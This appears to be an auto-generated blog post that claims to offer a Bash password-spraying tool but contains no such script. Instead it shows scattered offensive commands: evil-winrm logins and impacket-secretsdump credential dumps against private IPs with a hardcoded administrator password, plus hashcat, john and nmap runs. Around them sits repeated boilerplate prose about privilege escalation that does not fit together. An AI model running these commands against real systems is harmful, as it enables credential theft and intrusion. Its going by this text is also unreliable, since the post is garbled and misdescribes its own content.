---
TitleSEO: "Password Spraying Tool in Bash | ZureFX"
TitlePost: "Password Spraying Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for password spraying tool. Built for security research and automation."
Keywords: "c, script, scanner, bash"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-772.html"
URL_IMAGES: ""
Date: "2025-11-03"
Tags: "C, Script, Scanner, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-772"
Permalink: "/scripting/script-password-spraying-tool-772.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `atexec`
- `wpscan`
- `atexec`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.14.72.121 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.219.167
```

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.56.247
```

## Usage

### Basic Usage

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p53,27017,22 10.48.30.227 -oN scan.txt
nmap -sCV -p8443,5985,636 10.49.51.116 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 24.88s
```
